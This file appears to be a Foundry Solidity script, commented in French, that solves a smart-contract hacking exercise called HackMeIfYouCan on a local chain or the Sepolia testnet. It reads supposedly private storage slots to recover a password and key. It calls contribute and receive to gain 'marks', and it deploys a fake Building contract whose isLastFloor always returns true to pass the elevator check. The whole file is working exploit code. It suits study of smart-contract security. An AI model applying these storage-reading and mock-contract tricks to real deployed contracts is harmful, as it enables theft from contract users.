// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import {Script} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract BuildingMock is Building {
    function isLastFloor(uint256) external override returns (bool) {
        return true;
    }
}

contract AttackHackMeIfYouCan is Script {
    function run() external {
        bool isLocal = vm.envBool("IS_LOCAL");
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address payable contractAddress = payable(vm.envAddress("CONTRACT_ADDRESS"));

        // Utilisez cast pour obtenir les données de stockage
        bytes32 password = vm.load(contractAddress, bytes32(uint256(3)));
        bytes32 key = vm.load(contractAddress, bytes32(uint256(4 + 12)));

        vm.startBroadcast(privateKey);

        HackMeIfYouCan hackMe;

        if (isLocal) {
            // Déployez le contrat en local
            bytes32[15] memory data = [
                bytes32(0), bytes32(0), bytes32(0), bytes32(0), bytes32(0),
                bytes32(0), bytes32(0), bytes32(0), bytes32(0), bytes32(0),
                bytes32(0), bytes32(0), bytes32(0), bytes32(0), key
            ];
            hackMe = new HackMeIfYouCan(password, data);
            emit Log("Contract deployed locally");
        } else {
            // Utilisez le contrat déployé sur Sepolia
            hackMe = HackMeIfYouCan(contractAddress);
            emit Log("Using deployed contract on Sepolia");
            emit LogAddress(contractAddress);
        }

        // Attaque pour maximiser les marks
        emit Log("Starting marks maximization...");

        // 1. Envoyez des ethers pour obtenir des marks via contribute et receive
        (bool contributeSuccess,) = address(hackMe).call{value: 0.0001 ether}(abi.encodeWithSignature("contribute()"));
        emit Log(contributeSuccess ? "contribute: success" : "contribute: failed");

        (bool receiveSuccess,) = address(hackMe).call{value: 0.001 ether}("");
        emit Log(receiveSuccess ? "receive: success" : "receive: failed");

        // 2. Appel à la fonction addPoint pour essayer d'ajouter des points
        emit Log("Attempting to add point...");
        try hackMe.addPoint() {
            emit Log("addPoint called");
        } catch Error(string memory reason) {
            emit Log(reason);
        } catch {
            emit Log("addPoint failed for unknown reason");
        }

        // 3. Essayez d'envoyer la clé correcte
        emit Log("Attempting to send key...");
        try hackMe.sendKey(bytes16(key)) {
            emit Log("sendKey called");
        } catch Error(string memory reason) {
            emit Log(reason);
        } catch {
            emit Log("sendKey failed for unknown reason");
        }

        // 4. Essayez d'envoyer le mot de passe correct
        emit Log("Attempting to send password...");
        try hackMe.sendPassword(password) {
            emit Log("sendPassword called");
        } catch Error(string memory reason) {
            emit Log(reason);
        } catch {
            emit Log("sendPassword failed for unknown reason");
        }

        // 5. Atteignez le dernier étage en utilisant un mock de Building
        emit Log("Attempting to go to the last floor...");
        BuildingMock buildingMock = new BuildingMock();
        try hackMe.goTo(address(buildingMock), 100) {
            emit Log("goTo called");
        } catch Error(string memory reason) {
            emit Log(reason);
        } catch {
            emit Log("goTo failed for unknown reason");
        }

        // Récupérez les marks pour l'adresse actuelle
        uint256 marks = hackMe.getMarks(address(this));
        emit LogUint("Marks after actions", marks);

        vm.stopBroadcast();
    }

    event Log(string message);
    event LogAddress(address addr);
    event LogUint(string message, uint256 val);

    receive() external payable {}
}
